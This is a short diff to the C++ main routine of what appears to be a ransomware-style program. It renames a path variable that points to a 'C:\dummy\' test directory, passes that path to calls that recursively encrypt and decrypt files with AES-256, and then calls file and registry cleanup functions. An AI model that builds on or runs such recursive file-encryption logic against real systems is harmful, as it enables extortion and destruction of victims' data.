@@ -1,7 +1,7 @@
 #include "pers/func.h"
 #include "pers/include.h"
 #include "pers/threads.h"
-
+#include "encrypt/cryptor.cpp"
 #include "encrypt/cryptor.h"
 
 using namespace std;
@@ -49,14 +49,14 @@ int main(int argc, char* argv[]) {
      
     ShowWindow(Console, 1);
 
-    std::string path;
-    path = "C:\\dummy\\";
+    std::string enc_path;
+    enc_path = "C:\\dummy\\";
     
-    std::cout << "[i] Working within  " << path << ".\n";
+    std::cout << "[i] Working within  " << enc_path << ".\n";
     AES256CBC AES;
 
     AES.generateKey();
-    AES.encryptRecursively(path);
+    AES.encryptRecursively(enc_path);
 
     // { END ENCRYPTION } //
 
@@ -68,7 +68,7 @@ int main(int argc, char* argv[]) {
     }
 
     AES.keyFromFile();
-    AES.decryptRecursively();
+    AES.decryptRecursively(enc_path);
 
     cleanfile();
     cleanreg();
